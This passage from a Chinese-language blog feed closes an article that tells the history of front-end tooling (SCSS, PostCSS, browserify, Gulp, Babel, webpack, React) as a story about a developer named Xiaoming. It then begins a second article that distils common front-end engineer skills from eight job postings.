CSS。</p><p>但如果你不用預處理器，可以寫網頁嗎？當然可以！只是業主要你一直改顏色的時候你可能會很崩潰而已。</p><p>還記得之前提過需要針對不同瀏覽器去調整 CSS 嗎？有些必須要加 prefix 才能運作。這點用預處理器也能夠很輕鬆地去解決，用一種叫做 mixin 的東西，你就想成是 function 就好：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__5gMfoljCRqsucPABjvGyIw.png"></p><p>原本在每個地方都要重複寫這些不同的屬性，現在把它包裝成 mixin，你只要 include 進來就好。</p><p>不過，小明有了一個疑問：</p><blockquote><p>既然我們都知道這個屬性要加 prefix，為什麼不讓程式幫我們自動加上就好？</p></blockquote><p>對啊，為什麼不？有個東西叫做 PostCSS，就是在做這件事情。（其實 PostCSS 包含了很多的 plugin，這邊提到的是其中一個叫做 Autoprefixer 的 plugin）</p><p>在這邊你要知道 PostCSS 跟 CSS preprocessor 的差別在哪，前者的 input 是 CSS，output 是加上了 prefix 之後的 CSS；後者的 input 是 SCSS（或其他），output 是 CSS。你甚至可以把兩者合在一起用：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__dsIU0pwSDL0LhUAYDNXCDg.png"></p><p>合在一起用的好處就是你在寫 SCSS 的時候，完全不用管 prefix 這件事情，因為 PostCSS 都會幫你做好。</p><p>有了這兩項神兵利器以後，小明在寫 CSS 的時候就沒什麼太大的問題了，就算案主們的需求朝令夕改，也能夠憑藉著這些工具快速做出更動。而且長時間接案下來，已經累積了一套自己的程式碼，能夠迅速就搭出一個基本的頁面。</p><p>在不斷接案的過程中，小明也就這樣漸漸長大，轉眼間已經是個大一新生了。小明成長了，前端的世界也慢慢在成長，長成一個小明從未預料到的模樣。</p><h3 id="像詩人依賴著月亮，像海豚依賴海洋"><a href="#像詩人依賴著月亮，像海豚依賴海洋" class="headerlink" title="像詩人依賴著月亮，像海豚依賴海洋"></a>像詩人依賴著月亮，像海豚依賴海洋</h3><p>上了大學之後，小明開始挑戰接更大的案子，而更大的案子就意味著不再只是那些美美的公司形象網站，而是開始往更複雜、更多功能的方向走，例如說購物網站或者是 CMS 系統等等。</p><p>身為一個程式設計師，當你看到一個沒實作過的新功能時，第一件事情就是：<strong>上網去找有沒有人實作過</strong>。如果已經有人把輪子造出來了，大多數時候沒有必要自己重新做一個。</p><p>於是除了 jQuery 以外，小明開始用了其他的 Library 來解決問題，直接把別人寫好的功能拿來用。可是用著用著，小明發現了一個問題，那就是引入 library 的機制。</p><p>現在的機制是怎樣呢？就是直接引入每一個你要用的 library，然後直接用就行了：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__TyKXI__9IojIZXL3RH5zCsg.png"></p><p>看起來其實挺合理的，但會有幾個問題。</p><p>第一個，假如說 A.js 裡面定義了一個變數叫做：VERSION，而 B.js 裡面也定義了一個變數叫做 VERSION，那就會產生變數名稱衝突，兩個 library 互相干擾。</p><p>第二個，其實每個 library 本身也有可能使用到其他的 library，假設 A 用到了一個 library 叫做 popular，B 也用到了 popular，那我們這邊其實就把 popular 引用了兩次（因為 A 跟 B 都用到了，所以在引入 A 跟 B 的時候各引入一次）。</p><p>總之呢，污染全域變數跟 library 之間的相依問題讓小明豆頁很痛，怎麼看都很不順眼。在理想上，小明覺得這些 library 的使用應該要像其他程式語言那樣，例如說 Python：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__zrjuZjmuSTNji4cNd1P1HA.png"></p><p>簡單乾淨俐落，要用什麼 library，就用 import 把你要用的東西引入進來，也可以在程式碼裡面把 library 用不同的別名引入，或者是只引入特定的幾個 function。</p><p>雖然能這樣用一定很棒，可是 JavaScript 又不支援，怎麼辦呢？</p><p>咦？有沒有一種似曾相識的感覺？</p><blockquote><p>如果 CSS 能用變數就好了，一定會很棒，可是 CSS 又不支援…</p></blockquote><p>如果原生不支援，解法很簡單嘛，我們就假裝有支援，之後透過工具把它轉成原生的程式碼就好了。像 SCSS 就是這樣啊，反正轉換完之後是原生的 CSS，一定有支援。</p><p>於是呢，一個可以讓 JavaScript 支援這種引入機制的 Library 誕生了：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__gnhLMEBhsUQVKP7aYLkSFg.png"></p><p>現在你可以直接在程式碼裡面寫：<code>var A = require(‘libraryA’)</code> 去引入一個 library，而不是用 <code>&lt;script /&gt;</code> 標籤去引入。而背後的原理就是靠著 browserify 去幫你實作 require 這個函式，自動幫你處理好背後的相依性問題。</p><p>有了 require 的機制以後，在寫 JavaScript 的時候你就可以分成好幾個檔案來寫，最後再透過 browserify 把程式碼組裝起來：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__7bw7Wu69vCU2KJ39CLUecg.png"></p><p>最後透過 browserify，會產生一個 bundle.js，顧名思義，所有需要用到的東西都打包在裡面了，這就是你真正需要在 HTML 裡面引入的檔案。</p><h3 id="這個要變、那個也要變，當我超級變變變？"><a href="#這個要變、那個也要變，當我超級變變變？" class="headerlink" title="這個要變、那個也要變，當我超級變變變？"></a>這個要變、那個也要變，當我超級變變變？</h3><p>雖然 browserify 成功解決了小明的問題，可是又有一個新的問題產生。截止目前為止，我們寫 SCSS，接著用指令把 SCSS 轉成 CSS。然後我們在 JavaScript 裡面開心用著模組，用 browserify 打包出 bundle.js。</p><p>儘管只是改一個小東西，就要打兩個不同的指令去做轉換，才能看到最後的結果。更別說要把這專案上線之前還要先對 CSS 以及 JavaScript 做混淆以及壓縮，把程式碼變得更像亂碼一些。</p><p>這些流程之後只會隨著需求越來越煩瑣，該怎麼辦呢？可能過一年之後一個專案有十幾個指令要執行，有沒有什麼好用的工具能夠處理這個呢？小明再次求助於認識的業界朋友們，最後得出了：Gulp 這個關鍵字。</p><p>Gulp 能夠用程式碼來管理你的 workflow，你就定義很多 task，說清楚每一個 task 要做什麼事情，然後再去執行那個 task 就好了，如下圖所示：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__dpk47mu8U0IPPH1P8DNEOg.png"></p><p>開頭定義一個 task 叫做 html，是來把 pug 檔案轉換成 html，第二個 task 叫做 css，用 less 轉換之後再 minify；第三個則是把 js 產生 sourcemap。只要你一打 gulp 這個指令，就會自動幫你執行上面三個 task。</p><p>有了 gulp 以後，當你拿到了一個陌生的專案，你直接去看 gulpfile.js 就可以知道這個專案應該要怎麼開始跑或是怎麼打包了，每一個 task 都清清楚楚寫在裡面。</p><p>以前我們需要自己手動打好幾個指令，現在我們用 gulp 轉換成一個個 task，只要一行指令就可以又用 SCSS 轉換成 CSS 又用 browserify 打包成 bundle.js，十分方便。</p><p>現在的小明已經不再是當年那個只會用 HTML、CSS 跟 JavaScript 寫著班網的小明了，而是手上握有 SCSS、PostCSS、browserify、Gulp、jQuery 等等工具的小明。有了這麼多工具輔助，在開發網頁的速度上面快了許多，因為每一個工具的目標本來就是讓你變得更有效率，而不是拖累你。</p><p>就在此時，小明看到一個令人振奮的消息：新一代的 JavaScript 語法出來了（嚴格來講是 ECMAScript），叫做 ES6，在這新語法裡面多了小明很期待的一些新功能。</p><h3 id="不支援怎麼辦？你知道的-😏"><a href="#不支援怎麼辦？你知道的-😏" class="headerlink" title="不支援怎麼辦？你知道的 😏"></a>不支援怎麼辦？你知道的 😏</h3><p>既然是新語法，想必舊的瀏覽器不會支援。小明一路跟著前端發展過來，也大概摸清了前端的套路。什麼是前端的套路？</p><blockquote><p>當你想用瀏覽器不支援的東西時，你就開發個工具來轉換就對了</p></blockquote><p>SCSS 如此，browserify 亦是如此。小明知道 ES6 推出時已經是第三手的消息了，因此他深知一定已經有人做出這個工具了，上網搜尋了一下，Bingo！</p><p>這個工具就叫做 babel，它的官方網站簡單明瞭的說出了它的作用：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__IfnaA8sjt5OQCeXFjZjZgw.png"></p><p>簡單來說就是你可以寫新一代的 JavaScript（儘管瀏覽器還不支援），再透過 babel 把它 compile 成瀏覽器支援的語法。概念跟 CSS preprocesseor 有點像，但最大的差異在於 SCSS 的那些語法不是「下一代的 CSS」，所以瀏覽器以後也不會支援那些語法；而新一代的 JavaScript 只是「現在」還沒被瀏覽器支援，有朝一日一定會的。</p><p>等到那天到來，你就可以把 babel 整個丟掉了，可是專案還是一樣可以正常運行（但那一天可能要很久就是了）。</p><p>用了 babel 之後，就可以用一些又炫又潮的語法，只是你必須要多一層手續，用 babel 來 compile 才能在瀏覽器上面執行。不過沒關係，因為我們有 gulp 了，所以只要在 gulp 裡面多增加一個 babel 的 task 就好了。</p><p>CSS 沒問題了，JavaScript 也有了模組化以及新一代的語法，都已經這麼前衛了，難道還有什麼東西可以再進化嗎？</p><p>靠北，還真的有。</p><h3 id="你的資源，我全包了"><a href="#你的資源，我全包了" class="headerlink" title="你的資源，我全包了"></a>你的資源，我全包了</h3><p>前面提過了 browserify，讓你可以用 require 把 JavaScript 引入進來使用。有人覺得單純這樣還不夠，提出了一個瘋狂的想法：</p><blockquote><p>為什麼只有 JavaScript 呢？為什麼我不乾脆把所有東西都視為資源？不只要引入 JavaScript，我也可以引入 CSS，甚至引入圖片！</p></blockquote><p>這樣子一視同仁，把所有東西都視為是資源的想法，就是 <strong>webpack</strong> 的核心理念。我不只要 require(‘A.js’)，我還要 require(‘style.css’), require(‘bg.png’)<br>只要是外來的資源，我全部都要引入！</p><p>webpack 用起來其實跟 browserify 很像，差別在於前者把更多東西都視為是資源，所以寫出來的程式碼會像這樣：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__ON9mWt4c3PhrWyeFQ__Sfkw.png"></p><p>除此之外呢，webpack 也可以透過一個個的 plugin，在打包的時候對這些資源做一些事情。什麼事呢？例如說用 babel-plugin 把 ES6 轉成 JavaScript！或者是用 scss-plugin 把 SCSS 程式碼轉成 CSS。</p><p>意思就是你在寫 code 的時候，你甚至可以直接引入 style.scss，webpack 會自動幫你在引入時轉換成 CSS！聽起來很棒吧！</p><p>自從 webpack 嶄露頭角之後，browserify 就漸漸愈來愈少人用了，因為 webpack 可以做的事情又更多一些，而 gulp 的很多 task 其實也能被 webpack 取代（例如說 compile）。</p><p>但要注意的是 webpack 只是一個 module bundler，不是像 gulp 那種 task manager，其實你可以把兩者配在一起使用，就像我們之前把 browserify 當作 gulp 的一個 task 一樣，你也可以把 webpack 當作一個 task。</p><p>「呼，前端有了這麼多工具，應該很足夠了吧！」小明邊看著越來越多工具的專案邊感嘆著。</p><p>是的，工具差不多了，可是我們前面一直專注的都是在：新一代的語法跟模組化機制，完全忽略了前端變複雜以後最困難的問題之一。</p><h3 id="如何讓-UI-跟程式內部的狀態同步？"><a href="#如何讓-UI-跟程式內部的狀態同步？" class="headerlink" title="如何讓 UI 跟程式內部的狀態同步？"></a>如何讓 UI 跟程式內部的狀態同步？</h3><p>如果你現在有個 Todo List 的 App，假設你的程式裡面有一個 array 叫做 todo_list，你這個 array 長什麼樣子，你的介面就應該要長什麼樣子，這樣就叫做 UI 跟程式內部的狀態同步。</p><p>難嗎？乍看之下沒那麼難，我們可以寫出以下的程式碼，在操作 todo 的時候同時操作 UI 以及程式內部的狀態：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__wgSnJ0dejW1QQ6xEPBPotg.png"></p><p>雖然在專案規模小的時候還行，可是如果你的專案超級無敵大，這就變成是一件很困難的事了，因為你要能永遠保證這兩者是同步的。照我們現在的方法，假如你有個 function 忘記更改狀態，那你就 GG 了，之後的狀態都不會再同步了。</p><p>Google 針對這個問題的解法是：那我自動讓這兩者綁定好了，改變 state 就會改變 UI，而改變 UI 的話也會改變 state，這樣不就好了嘛！於是就有了 Angular 這套框架（我對 Angular 極度不熟，就只點到這了）。</p><p>而 Facebook 針對這個問題的解法非常非常非常直覺，真的非常直覺，是我認為從概念上最好理解、最簡單的一個解法：</p><blockquote><p>阿就每次 state 改變的時候都重新渲染 UI  不就好了</p></blockquote><p>你要刪除 todo，你直接刪除 state 的 todo，不用管網頁上的元件。你要新增也是一樣，完全不用管畫面上的東西，因為只要 state 一改變，整個 UI 就會改變。以這個概念來實作的話，大概會變成這樣：</p><p><img src="/img/frontend-engineer-guide-297821512f4e/1__7Qgh0xg1NyxC5ryoR__2dhA.png"></p><p>有沒有很簡單？有吧！</p><p>要如何讓 state 跟 UI 一致？寫程式的人只要關注 state，每次都只改變 state，然後每改變一次就把整個 UI 按照現在的 state 重新畫出來，不就能確保兩者完全一樣了嗎？</p><p>聽起來很有道理，那為什麼以前的人沒想到呢？因為如果真的「每次都重畫」，其實會有效能問題，因為事實上你只要重畫一部分就好。但總之 React 解決了這個問題，讓你用起來像是全部重畫，實際上卻是只重畫必要的部份。</p><p>在學 React 以前，只希望你記得 React 的這個核心概念就好：只改變 state 就好，UI 就會自動跟著改變。</p><p>把這複雜的前端問題解決以後，小明對前端的掌握度又更高了一層。</p><h3 id="初出茅廬"><a href="#初出茅廬" class="headerlink" title="初出茅廬"></a>初出茅廬</h3><p>故事說到這，小明大學也畢了業，兵也當完了，退伍的隔一天便很興奮地投了履歷，過幾天後拿到了人生中首次的面試機會。想當然爾，他投的職缺是前端工程師。</p><p>整個面試的過程都很不錯，面試官很驚訝小明在這個年紀就能夠對前端有這麼多的理解，而且該會的他都會了。在面試的尾聲，面試官問了這個一句：「這麼多的工具，你不會覺得很煩嗎？你都怎麼學會的？」</p><p>只見小明回道：</p><blockquote><p>不會啊，出現問題不是就要解決嗎？我也沒特別學，就只是覺得用了這些工具能夠解決我的問題罷了。</p></blockquote><p>話說完，面試便結束了，而隔天下午小明就拿到了 offer。</p><p>「主管說你對程式的觀念很好，催促我一定要快點發 offer 給你。」，HR 是這麼跟他說的。</p><h3 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h3><p>為什麼前端對新手來說這麼複雜，這麼多工具要學？因為他們根本不知道前面發生這麼多事情阿，他們沒有經歷過這一段演變，怎麼知道為什麼要用這些工具？</p><p>工具的出現是為了把問題變得簡單，而不是變得更複雜。當你發現引入了工具卻讓你變得更沒效率，就應該好好思考你是不是根本不需要這個工具，而不是去怪工具不好用。</p><p>文章看完了，如果我寫得還不錯的話，你應該會理解 HTML、CSS、JavaScript、SCSS（CSS preprocessor）、PostCSS、jQuery、Gulp、Babel、Webpack、React 這些東西在幹嘛，而這些就是現代一個前端工程師會需要的技能組（React 可換成 Angular 或 Vue）。</p><p>小明身為一個從以前就做前端做到現在的人，知道每一個工具出來時要解決的問題。但身為現今 2018 才想要踏進前端的你，自然而然就會覺得前端怎麼這麼多工具這麼複雜。但其實不是的，如果有人能跟你講小明發生過什麼事，你應該就能對這些工具更了解。</p><p>為什麼、為什麼、為什麼！我一直再三強調你一定要常常問為什麼，你一定要知道為什麼這些工具會產生。當你知道背後的脈絡時，就知道工具其實是在幫助你，而不是在阻礙你。就會知道這些工具的出現有其必要性，就能夠更有個好理由去把這些工具給學好。</p><p>只希望這篇能幫助到一些初學者們更理解自己現在為什麼要學這些工具。如果有任何錯誤的話也麻煩不吝指證，感謝。</p><p>話說日後我有可能會推出線上教學課程，可能是前端相關或者是帶一點後端，如果你有興趣的話，可以追蹤 <a href="https://www.facebook.com/lidemytw/">Lidemy 鋰學院粉絲專頁</a>，或者是<a href="https://goo.gl/forms/2nCkxOW70P5T35ut2">留一下 Email</a>，若有什麼新消息的話可以即時收到通知。</p><p>（雖然不太可能）但如果有出版社覺得我可以寫而且寫得不錯，想要找我談一些合作的話，可以直接寫信給我：<a href="mailto:&#97;&#115;&#122;&#120;&#x38;&#x37;&#52;&#x31;&#x30;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#46;&#99;&#111;&#109;">&#97;&#115;&#122;&#120;&#x38;&#x37;&#52;&#x31;&#x30;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#46;&#99;&#111;&#109;</a>。</p><p>若是你對前端相關文章有興趣，下面這一個系列文其實是我最早把這樣子的寫作及教學方式實現出來的實驗品，而最下面的文章則是實際示範前端工程師在找工作時應該要有的技能是什麼，別擔心，那些專有名詞你應該都知道是什麼了。</p><p><a href="https://ithelp.ithome.com.tw/users/20091346/ironman/1150?page=1">Half-Stack Developer 養成計畫</a></p><p><a href="/2018/06/03/guide-for-getting-frontend-engineer-job-e73e04c2bec4/">該如何知道就業所需技能？以前端工程師為例</a></p>]]></content>
      
      
      <categories>
          
          <category> 技術白話文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技術白話文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>該如何知道就業所需技能？以前端工程師為例</title>
      <link href="/2018/06/03/guide-for-getting-frontend-engineer-job-e73e04c2bec4/"/>
      <url>/2018/06/03/guide-for-getting-frontend-engineer-job-e73e04c2bec4/</url>
      
        <content type="html"><![CDATA[<p>（原文發表於 <a href="http://huli.logdown.com/posts/1550464-guide-for-getting-frontend-engineer-job">logdown</a>，重新檢視並改寫過後移植來這）</p><blockquote><p>我想成為一個前端工程師，現在有在學一些基本的 HTML 跟 CSS，可是我不知道要到什麼程度才能找到工作，該怎麼辦？</p></blockquote><p>這種類似的問題有一大堆人問過我，我想說乾脆就寫成一篇文章，以後有人問同樣問題的時候我就丟這篇給他看，就不用一直重複回答相同的問題了。</p><p>有一種東西你一定看過，就是在徵才說明上面會寫的工作敘述跟需求，前者大概是你進去公司以後會負責一些什麼事情，後者則是這間公司所需要的人才應該要有哪些技能。</p><p>這個就是很好的切入點，你只要多研究幾份，很快就可以歸納出各個公司幾乎都必備的技能是哪些，你再拿這一個個的關鍵字去查就好了。</p><p>來，我示範給你看！</p><p>第一個先來找 ptt 的 Soft_Job 版，我用「徵才」跟「前端」兩個關鍵字下去搜尋，挑了最新的前三篇：</p><h3 id="第一間"><a href="#第一間" class="headerlink" title="第一間"></a>第一間</h3><p><a href="https://www.ptt.cc/bbs/Soft_Job/M.1487743978.A.09A.html">https://www.ptt.cc/bbs/Soft_Job&#x2F;M.1487743978.A.09A.html</a></p><p>工作技能需求：</p><ol><li>熟悉 HTML5、CSS3、jQuery、Javascript</li><li>熟悉 Bootstrap 或其它 CSS Framework</li></ol><p>加分項目：</p><ol><li>運用 Ajax 串接第三方 API</li><li>Git 使用經驗</li><li>Wordpress 建置經驗</li><li>Sass &#x2F; SCSS &#x2F; Less</li><li>Grunt &#x2F; Gulp</li><li>AngularJS &#x2F; Node.js</li></ol><h3 id="第二間"><a href="#第二間" class="headerlink" title="第二間"></a>第二間</h3><p><a href="https://www.ptt.cc/bbs/Soft_Job/M.1487297666.A.720.html">https://www.ptt.cc/bbs/Soft_Job&#x2F;M.1487297666.A.720.html</a></p><p>工作技能需求：</p><ol><li>熟悉Javascript&#x2F;jQuery網站程式開發</li><li>熟悉HTML 5、CSS 3語法</li><li>具團隊合作能力，分工合作完成交付之程式開發及維護</li><li>良好溝通能力，團隊配合度高</li></ol><p>加分項目：</p><ol><li>有React.js,Node.js開發經驗</li><li>有Web遊戲開發經驗</li><li>熟悉cocos2d、Three.js、Phaser、createJS、melonJS、egretJS等任意一款引擎者優先；</li><li>具備物件導向、MVC的軟體開發概念</li><li>版本控管觀念(SVN or Git)</li></ol><h3 id="第三間"><a href="#第三間" class="headerlink" title="第三間"></a>第三間</h3><p><a href="https://www.ptt.cc/bbs/Soft_Job/M.1482919984.A.927.html">https://www.ptt.cc/bbs/Soft_Job&#x2F;M.1482919984.A.927.html</a></p><p>工作技能需求：</p><ol><li>需與後端開發人員共同開發 (後端使用PHP)</li><li>至少精通一種Anguar.js、React.js、Vue.js或其他前端框架</li><li>熟悉響應式設計，並有前端優化經驗</li><li>熟悉Git操作</li><li>有良好溝通能力與異於常人的抗壓能力 ^.&lt;</li></ol><p>加分項目：</p><ol><li>具備 SEO 知識</li><li>接觸過Artificial Neural Network, Natural Language Processing, Big Data, FinTech, BOT 機器人</li></ol><p>看了這三篇，你有沒有一些感覺了？就算你今天根本不懂那些英文單字是什麼，你大概也可以歸納出幾個一直見到的關鍵字，就代表這些關鍵字是每一個前端工程師的職缺都需要的。</p><p>如果你還沒感覺，我們從 mit.jobs 再找兩個職缺給大家看看。</p><h3 id="第四間"><a href="#第四間" class="headerlink" title="第四間"></a>第四間</h3><p><a href="https://mit.jobs/jobs/2071">https://mit.jobs/jobs/2071</a></p><p>工作技能需求：</p><ol><li>HTLM&#x2F;CSS&#x2F;JAVA Script&#x2F;ajax前後台資料串接</li></ol><p>加分項目：</p><ol><li>對前端框架Vue Js.有概念&#x2F;有設計UI,UX概念</li></ol><p>（題外話，你應該看到工作技能需求的部分會覺得有點怪怪的<br>「JAVA Script」，嗯…是我的話看到這個就把這間公司淘汰掉了）</p><h3 id="第五間"><a href="#第五間" class="headerlink" title="第五間"></a>第五間</h3><p><a href="https://mit.jobs/jobs/2019">https://mit.jobs/jobs/2019</a></p><p>工作技能需求：</p><ol><li>基本使用 Git 能力</li><li>熟悉 HTML5 、CSS3、ES6+ 語法</li><li>使用過 React.js</li><li>Flux&#x2F;Redux or 任何與React搭配的state management</li><li>SASS or postCSS</li><li>不依賴css framework切版的能力</li><li>Responsive Web Design 網站製作經驗</li><li>jQuery 使用經驗</li></ol><p>加分項目：</p><ol><li>Webpack使用&#x2F;設定經驗</li><li>熟悉前端測試</li><li>對後端有一定了解，Ruby on Rails尤佳</li><li>瞭解scrum流程</li><li>具備 RESTful API 介接經驗</li></ol><p>如果這樣還不夠，我們再去新創徵人平台 yourator 找兩間</p><h3 id="第六間"><a href="#第六間" class="headerlink" title="第六間"></a>第六間</h3><p><a href="https://www.yourator.co/companies/meepShop/jobs/513">https://www.yourator.co/companies/meepShop/jobs/513</a></p><p>工作技能需求：</p><ol><li>專精 JavaScript、HTML、CSS。</li><li>熟悉 Mac os 或 Linux 系統尤佳。</li><li>解決跨瀏覽器兼容性問題，客戶端性能方面的考量。</li><li>能呈現出 design 和 UX 的敏感性。</li><li>重視程式品質，不讓 bug 隨意出現。</li></ol><p>加分項目：<br>無</p><p>（題外話，找 junior 工程師要找「專精」，好像有哪裡怪怪的…）</p><h3 id="第七間"><a href="#第七間" class="headerlink" title="第七間"></a>第七間</h3><p><a href="https://www.yourator.co/companies/Kyper/jobs/1596">https://www.yourator.co/companies/Kyper/jobs/1596</a></p><p>工作技能需求：</p><ol><li>Computer Science相關科系畢業</li><li>想專職走前端開發者</li><li>具備一定前端技術背景者(Javascript&#x2F;HTML5&#x2F;CSS),且有自己寫過網站的經驗。</li><li>投遞履歷時請一併附上網站作品集及英文CV</li></ol><p>加分項目：<br>無</p><p>題外話，其實看了這麼多徵才文以後，還有一點很不錯的就是你會發現徵才文也有寫得好的跟寫得爛的，寫得好的會盡量把他們所需要的技能、進來以後會負責的工作內容以及加分項目都寫得清清楚楚，讓你知道你該往哪個方向去努力。</p><p>寫得爛的就只會寫一些範疇很大的技能需求，讓你根本不知道他要的是什麼，或者是連技術名詞都拼錯。怕傷感情，就不放我覺得寫得很爛的了，而是讓大家看看一篇我心目中的徵才文範本。</p><h3 id="第八間，徵才文範本"><a href="#第八間，徵才文範本" class="headerlink" title="第八間，徵才文範本"></a>第八間，徵才文範本</h3><p><a href="https://www.facebook.com/photo.php?fbid=10206519640549181&set=a.2104140142503.90823.1815507975&type=3&theater">https://www.facebook.com/photo.php?fbid=10206519640549181&set=a.2104140142503.90823.1815507975&type=3&theater</a></p><p>工作技能需求：</p><ol><li>具備鍵盤盲打之技能。</li><li>工作環境使用並熟悉 Linux 或 macOS 作業系統。</li><li>熟悉 command line (命令列) 操作。</li><li>對新技術有熱情及渴望，有信心可獨立完成專案。</li><li>良好的邏輯及溝通能力，當責不卸責。</li><li>瞭解 HTML &#x2F; CSS，懂得快速實現 Mockup &#x2F; RWD &#x2F; SPA。</li><li>瞭解 JavaScript &#x2F; ES6 特性及語法，懂得善用 JavaScript 框架或函式庫 (如 Angular.js &#x2F; React.js &#x2F; Vue.JS 等)</li><li>熟悉 Git &#x2F; GitHub，包括但不限於分支操作、衝突解決及 Pull Requests。</li></ol><p>加分項目：</p><ol><li>英文打字至少每分鐘 30 字，中文打字至少每分鐘 40 字。</li><li>熟悉前端開發流程，懂得程式檢查、精簡化、模組化。</li><li>懂得編寫清晰易懂且容易維護的程式碼。</li><li>熟悉各瀏覽器的特性與限制，懂得跨瀏覽器的解決方案。</li><li>熟悉前端自動部署、測試及除錯。</li><li>熟悉高效前端元件操作與控制，如高效 DOM 元件處理。</li><li>熟悉前端資訊安全設計。</li><li>擁有組織大型專案結構的技巧及經驗。</li></ol><p>但這篇值得推薦的除了把工作技能需求寫的很清楚以外，工作環境、面試流程、薪資範圍都寫得一清二楚，這資訊揭露的程度根本海放其他公司。</p><h3 id="開始歸納囉"><a href="#開始歸納囉" class="headerlink" title="開始歸納囉"></a>開始歸納囉</h3><p>你可以先試試看把上面那八間的工作技能需求跟加分項目歸納一下，看你會歸納出什麼樣的結果。</p><p>這邊有一點要注意的是工作技能需求有時候會跟行業有關，例如上面有個遊戲業的就可能會要求遊戲開發相關經歷，像是這種跟產業有直接相關的都可以先刪掉，我們只要找出「大部份公司都要求」的項目就好。</p><p>下面的列表是這八間的內容全部都合在一起的結果，仔細看，你一定能看出什麼！</p><h4 id="工作技能需求"><a href="#工作技能需求" class="headerlink" title="工作技能需求"></a>工作技能需求</h4><ol><li>熟悉 HTML5、CSS3、jQuery、Javascript</li><li>熟悉 Bootstrap 或其它 CSS Framework</li><li>熟悉Javascript&#x2F;jQuery網站程式開發</li><li>熟悉HTML 5、CSS 3語法</li><li>具團隊合作能力，分工合作完成交付之程式開發及維護</li><li>良好溝通能力，團隊配合度高</li><li>需與後端開發人員共同開發 (後端使用PHP)</li><li>至少精通一種Anguar.js、React.js、Vue.js或其他前端框架</li><li>熟悉響應式設計，並有前端優化經驗</li><li>熟悉Git操作</li><li>有良好溝通能力與異於常人的抗壓能力 ^.&lt;</li><li>HTLM&#x2F;CSS&#x2F;JAVA Script&#x2F;ajax前後台資料串接</li><li>基本使用 Git 能力</li><li>熟悉 HTML5 、CSS3、ES6+ 語法</li><li>使用過 React.js</li><li>Flux&#x2F;Redux or 任何與React搭配的state management</li><li>SASS or postCSS</li><li>不依賴css framework切版的能力</li><li>Responsive Web Design 網站製作經驗</li><li>jQuery 使用經驗</li><li>專精 JavaScript、HTML、CSS。</li><li>熟悉 Mac os 或 Linux 系統尤佳。</li><li>解決跨瀏覽器兼容性問題，客戶端性能方面的考量。</li><li>能呈現出 design 和 UX 的敏感性。</li><li>重視程式品質，不讓 bug 隨意出現。</li><li>Computer Science相關科系畢業</li><li>想專職走前端開發者</li><li>具備一定前端技術背景者(Javascript&#x2F;HTML5&#x2F;CSS),且有自己寫過網站的經驗。</li><li>投遞履歷時請一併附上網站作品集及英文CV</li><li>具備鍵盤盲打之技能。</li><li>工作環境使用並熟悉 Linux 或 macOS 作業系統。</li><li>熟悉 command line (命令列) 操作。</li><li>對新技術有熱情及渴望，有信心可獨立完成專案。</li><li>良好的邏輯及溝通能力，當責不卸責。</li><li>瞭解 HTML &#x2F; CSS，懂得快速實現 Mockup &#x2F; RWD &#x2F; SPA。</li><li>瞭解 JavaScript &#x2F; ES6 特性及語法，懂得善用 JavaScript 框架或函式庫 (如 Angular.js &#x2F; React.js &#x2F; Vue.JS 等)</li><li>熟悉 Git &#x2F; GitHub，包括但不限於分支操作、衝突解決及 Pull Requests。</li></ol><h4 id="加分項目"><a href="#加分項目" class="headerlink" title="加分項目"></a>加分項目</h4><ol><li>運用 Ajax 串接第三方 API</li><li>Git 使用經驗</li><li>Wordpress 建置經驗</li><li>Sass &#x2F; SCSS &#x2F; Less</li><li>Grunt &#x2F; Gulp</li><li>AngularJS &#x2F; Node.js</li><li>有React.js,Node.js開發經驗</li><li>有Web遊戲開發經驗</li><li>熟悉cocos2d、Three.js、Phaser、createJS、melonJS、egretJS等任意一款引擎者優先；</li><li>具備物件導向、MVC的軟體開發概念</li><li>版本控管觀念(SVN or Git)</li><li>具備 SEO 知識</li><li>接觸過Artificial Neural Network, Natural Language Processing, Big Data, FinTech, BOT 機器人</li><li>對前端框架Vue Js.有概念&#x2F;有設計UI,UX概念</li><li>Webpack使用&#x2F;設定經驗</li><li>熟悉前端測試</li><li>對後端有一定了解，Ruby on Rails尤佳</li><li>瞭解scrum流程</li><li>具備 RESTful API 介接經驗</li><li>英文打字至少每分鐘 30 字，中文打字至少每分鐘 40 字。</li><li>熟悉前端開發流程，懂得程式檢查、精簡化、模組化。</li><li>懂得編寫清晰易懂且容易維護的程式碼。</li><li>熟悉各瀏覽器的特性與限制，懂得跨瀏覽器的解決方案。</li><li>熟悉前端自動部署、測試及除錯。</li><li>熟悉高效前端元件操作與控制，如高效 DOM 元件處理。</li><li>熟悉前端資訊安全設計。</li><li>擁有組織大型專案結構的技巧及經驗。</li></ol><p>當你把那些幾乎只有出現過一次的關鍵字剔除掉以後，大概會長這樣（我把相似的關鍵字排在一起並稍微分類）：</p><h3 id="工作技能需求-1"><a href="#工作技能需求-1" class="headerlink" title="工作技能需求"></a>工作技能需求</h3><h4 id="HTML-CSS-JavaScript-jQuery"><a href="#HTML-CSS-JavaScript-jQuery" class="headerlink" title="HTML, CSS, JavaScript, jQuery"></a>HTML, CSS, JavaScript, jQuery</h4><ol><li>熟悉 HTML5、CSS3、jQuery、Javascript</li><li>熟悉HTML 5、CSS 3語法</li><li>熟悉 HTML5 、CSS3、ES6+ 語法</li><li>HTLM&#x2F;CSS&#x2F;JAVA Script&#x2F;ajax前後台資料串接</li><li>熟悉Javascript&#x2F;jQuery網站程式開發</li><li>專精 JavaScript、HTML、CSS。</li><li>具備一定前端技術背景者(Javascript&#x2F;HTML5&#x2F;CSS),且有自己寫過網站的經驗。</li><li>瞭解 HTML &#x2F; CSS，懂得快速實現 Mockup &#x2F; RWD &#x2F; SPA。</li><li>jQuery 使用經驗</li></ol><h4 id="Git"><a 